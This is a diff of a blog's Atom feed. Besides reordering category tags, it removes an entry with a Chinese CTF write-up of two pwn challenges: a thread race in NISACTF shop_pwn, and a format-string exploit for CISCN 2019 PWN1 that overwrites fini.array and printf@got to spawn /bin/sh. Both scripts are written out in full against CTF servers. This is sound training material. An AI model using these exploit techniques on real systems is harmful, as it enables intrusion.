@@ -25,9 +25,9 @@
     <category term="pie" />
     <category term="格式化字符串漏洞" />
     <category term="house系列" />
-    <category term="house-of-apple" />
-    <category term="house-of-force" />
     <category term="house-of-einherjar" />
+    <category term="house-of-force" />
+    <category term="house-of-apple" />
     <category term="house-of-orange" />
     <category term="house-of-rabbit" />
     <category term="house-of-spirit" />
@@ -140,102 +140,5 @@ r.interactive()
         <category term="格式化字符串" />
         <category term="got表" />
         <updated>2023-09-22T12:04:31.000Z</updated>
-    </entry>
-    <entry>
-        <id>https://yhuanhuan01.github.io/2023/09/22/picture/new-pwn/</id>
-        <title>new_pwn</title>
-        <link rel="alternate" href="https://yhuanhuan01.github.io/2023/09/22/picture/new-pwn/"/>
-        <content type="html">&lt;h1 id=&#34;记录两道pwn题&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#记录两道pwn题&#34;&gt;#&lt;/a&gt; 记录两道 PWN 题&lt;/h1&gt;
-&lt;blockquote&gt;
-&lt;p&gt;给新生出题，出累了，随便看了两个 PWN 题，发现这两个 PWN 都值得记录一下&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;ul&gt;
-&lt;li&gt;ONE&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h2 id=&#34;nisactf-2022shop_pwn&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#nisactf-2022shop_pwn&#34;&gt;#&lt;/a&gt; [NISACTF 2022]shop_pwn&lt;/h2&gt;
-&lt;p&gt;题目标签：&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;/img/pwnlianxi/20230922180317483.png&#34; alt=&#34;20230922180317483&#34;&gt;&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;pthread_create 多线程竞争&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;&lt;img data-src=&#34;/img/pwnlianxi/20230922180537307.png&#34; alt=&#34;20230922180537307&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;执行程序如下：&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;/img/pwnlianxi/20230922180732045.png&#34; alt=&#34;20230922180732045&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;放入 IDA 看一下具体的函数：&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;/img/pwnlianxi/20230922180849649.png&#34; alt=&#34;20230922180849649&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;看一下主要的函数&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;/img/pwnlianxi/20230922181202034.png&#34; alt=&#34;20230922181202034&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;/img/pwnlianxi/20230922181325444.png&#34; alt=&#34;20230922181325444&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;脚本如下：&lt;/strong&gt;&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;这里利用了 pthread_create 创建进程，那么如果我们指令发送得快的话，那么就可以实现第一次售卖功能执行的时候正在 unsleep，接着执行第二次售卖功能，那么就能卖出两次得到可以购买 flag 的金钱了&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;&lt;strong&gt;pwntool 的 sendline 发送指令很快&lt;/strong&gt;&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;from pwn import *
-context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;, os=&#39;linux&#39;)
-r = remote(&#39;node5.anna.nssctf.cn&#39;,28929)
-r.sendline(&amp;quot;3&amp;quot;) 
-r.sendline(&amp;quot;0&amp;quot;) 
-
-r.sendline(&amp;quot;3&amp;quot;)
-r.sendline(&amp;quot;0&amp;quot;)  
-
-r.interactive()
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;strong&gt;结果如下：&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;/img/pwnlianxi/20230922181643187.png&#34; alt=&#34;20230922181643187&#34;&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;two&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h2 id=&#34;ciscn-2019西南pwn1&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ciscn-2019西南pwn1&#34;&gt;#&lt;/a&gt; [CISCN 2019 西南] PWN1&lt;/h2&gt;
-&lt;blockquote&gt;
-&lt;p&gt;当 &lt;code&gt;RELRO&lt;/code&gt;  保护为 &lt;code&gt;NO RELRO&lt;/code&gt;  的时候， &lt;code&gt;init.array、fini.array、got.plt&lt;/code&gt;  均可读可写；为 &lt;code&gt;PARTIAL RELRO&lt;/code&gt;  的时候， &lt;code&gt;ini.array、fini.array&lt;/code&gt;  可读不可写， &lt;code&gt;got.plt&lt;/code&gt;  可读可写；为 &lt;code&gt;FULL RELRO&lt;/code&gt;  时， &lt;code&gt;init.array、fini.array、got.plt&lt;/code&gt;  均可读不可写。&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;blockquote&gt;
-&lt;p&gt;程序在加载的时候，会依次调用 &lt;code&gt;init.array&lt;/code&gt;  数组中的每一个函数指针，在结束的时候，依次调用 &lt;code&gt;fini.array&lt;/code&gt;  中的每一个函数指针&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;blockquote&gt;
-&lt;p&gt;当程序出现格式化字符串漏洞，但是需要写两次才能完成攻击，这个时候可以考虑改写 &lt;code&gt;fini.array&lt;/code&gt;  中的函数指针为 &lt;code&gt;main&lt;/code&gt;  函数地址，可以再执行一次 &lt;code&gt;main&lt;/code&gt;  函数。一般来说，这个数组的长度为 &lt;code&gt;1&lt;/code&gt; ，也就是说只能写一个地址。&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;&lt;img data-src=&#34;/img/pwnlianxi/20230922182614061.png&#34; alt=&#34;20230922182614061&#34;&gt;&lt;/p&gt;
-&lt;p&gt;32 位程序修改 got 表。&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;执行程序参看偏移：&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;/img/pwnlianxi/20230922183714065.png&#34; alt=&#34;20230922183714065&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;看一下 IDA:&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;/img/pwnlianxi/20230922184018564.png&#34; alt=&#34;20230922184018564&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;/img/pwnlianxi/20230922184142420.png&#34; alt=&#34;20230922184142420&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;利用思路：&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;通过格式化字符串漏洞去修改 printf_got，修改为 system。但是程序只能执行一次，所以修改完后，程序会退出。&lt;/p&gt;
-&lt;p&gt;但是如果如下图所示&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;/img/pwnlianxi/20230922184525768.png&#34; alt=&#34;20230922184525768&#34;&gt;&lt;/p&gt;
-&lt;p&gt;我们就可以去修改 &lt;code&gt;fini.array&lt;/code&gt; , 将其参数 1，给覆写成 main，那么程序在退出后就会再次执行 main 函数。&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;payload：&lt;/strong&gt;&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;payload = b&amp;quot;%2052c%13&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;hn%31692c%14&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.69444em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;n&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;hn%356c%15$hn&amp;quot; + p32(0x804989c + 2) + p32(0x804989c) + p32(0x804979c)&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;通过 gdb 去看一眼 payload 进入程序的情况：&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;/img/pwnlianxi/20230922185014496.png&#34; alt=&#34;20230922185014496&#34;&gt;&lt;/p&gt;
-&lt;p&gt;当读入 pyload 时的情况&lt;/p&gt;
-&lt;p&gt;这时程序读入 payload。现在 got 表项指向的还是 printf_plt。&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;/img/pwnlianxi/20230922191625014.png&#34; alt=&#34;20230922191625014&#34;&gt;&lt;/p&gt;
-&lt;p&gt;当执行到 printf 函数时，printf_got 修改为 system  fini_array 的第一个参数修改为 main&lt;/p&gt;
-&lt;p&gt;当我们程序结束时，就会再次跳转到 main 函数入口，在读入 /bin/sh，接着会在调用 printf 函数，会执行 system (/bin/sh)，从而获取 shell&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;exp 如下：&lt;/strong&gt;&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;from pwn import *
-r = remote(&#39;node5.anna.nssctf.cn&#39;,28467)
-# r = gdb.debug(&amp;quot;./XNPWN1&amp;quot;)
-# 往fini.array[0]写main@text, printf@got写system@plt
-payload = b&amp;quot;%2052c%13$hn%31692c%14$hn%356c%15$hn&amp;quot; + p32(0x804989c + 2) + p32(0x804989c) + p32(0x804979c)
-r.recvline()
-
-r.sendline(payload)
-
-r.sendline(&amp;quot;/bin/sh&amp;quot;)
-r.interactive()
-&lt;/code&gt;&lt;/pre&gt;
-</content>
-        <category term="格式化字符串" />
-        <category term="got表" />
-        <updated>2023-09-22T11:51:06.000Z</updated>
     </entry>
 </feed>
